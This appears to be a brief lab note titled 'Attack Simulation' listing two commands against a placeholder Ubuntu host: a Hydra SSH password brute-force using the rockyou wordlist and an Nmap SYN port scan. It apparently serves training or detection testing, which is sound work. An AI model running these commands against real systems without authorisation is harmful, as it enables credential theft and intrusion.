# Attack Simulation

## SSH Brute Force (Hydra)
```bash
hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://<Ubuntu-IP>

## Port Scanning (Nmap)
nmap -sS -p 1-1000 <Ubuntu-IP>
